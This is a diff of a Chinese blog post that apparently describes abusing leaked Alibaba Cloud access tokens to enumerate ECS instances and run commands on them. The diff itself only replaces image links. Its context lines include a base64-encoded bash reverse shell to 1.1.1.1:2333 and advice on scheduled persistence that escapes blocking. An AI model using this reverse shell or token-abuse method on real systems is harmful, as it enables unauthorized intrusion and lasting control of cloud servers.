@@ -37,7 +37,7 @@ BucketName ：存储空间
 
 Region：地域，目前有如下几个：
 
-![2019-04-02-20-58-34](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b47095f0e521b2c64a785b3cbe165889.png)
+![2019-04-02-20-58-34](../../../static/images/5f10d050-4f5f-11ec-b934-00d861bf4abb.png)
 
 例如：杭州 = cn-hangzhou
 
@@ -82,27 +82,27 @@ Region : cn-*****
 
 DescribeInstances - 获得实例信息
 
-![2019-04-02-21-11-05](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e2155c603d701fd20696069aea984835.png)
+![2019-04-02-21-11-05](../../../static/images/5f4963fc-4f5f-11ec-9a56-00d861bf4abb.png)
 
 
 只有第一个`RegionId`是必填项，点击`API Explorer`，可以直接进入调试环境：
 
-![2019-04-02-21-12-38](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e7013aa30b06a0f6eb76ec22851c92b4.png)
+![2019-04-02-21-12-38](../../../static/images/5f9a2274-4f5f-11ec-8f74-00d861bf4abb.png)
 
 服务器上的oss配置中刚好有RegionId，我就直接选择了，然后填入Access Token信息，就可以获得数据。
 
 我是直接在`Alicloud Shell`里复制了一份运行的：
 
-![2019-04-02-21-16-55](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/29658b26756b91ad7999c3586697f73a.png)
+![2019-04-02-21-16-55](../../../static/images/5fe32866-4f5f-11ec-8225-00d861bf4abb.png)
 
 输出结果如下：
 
-![2019-04-02-21-21-17](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/3729d18e5454db84dfdd66b91344ea8c.png)
+![2019-04-02-21-21-17](../../../static/images/60291bd2-4f5f-11ec-88bc-00d861bf4abb.png)
 
 
 使用`json.cn`格式化一下：
 
-![2019-04-02-21-23-48](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6be7a9b9ceb7a55095aba804a63165dc.png)
+![2019-04-02-21-23-48](../../../static/images/607ec69a-4f5f-11ec-a155-00d861bf4abb.png)
 
 共四台服务器，那么如何执行命令呢？
 
@@ -124,7 +124,7 @@ rvn0xsy@Rvn0xsy ~> echo "bash -i >& /dev/tcp/1.1.1.1/2333 0>&1" | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=
 ```
 
-![2019-04-02-21-29-22](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/64788dbca11e1dfd99c53caae568dccc.png)
+![2019-04-02-21-29-22](../../../static/images/60c11202-4f5f-11ec-ac1c-00d861bf4abb.png)
 
 ```
 #!/usr/bin/env python
@@ -194,7 +194,7 @@ CommandId最好记下来，不然还要调用[DescribeCommands](https://api.aliy
 
 默认情况下，我们不需要管后面的参数，如果你想权限维持的话，可以设置Timed为False，并且设置Frequency为定时任务计划表达式，执行的过程中，基本上不会拦截，因为Access Token的调用，一切都是白名单的。
 
-![2019-04-02-21-39-17](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/af5818d425ef9c61361044a26dd6e804.png)
+![2019-04-02-21-39-17](../../../static/images/6109210a-4f5f-11ec-85d9-00d861bf4abb.png)
 
 
 
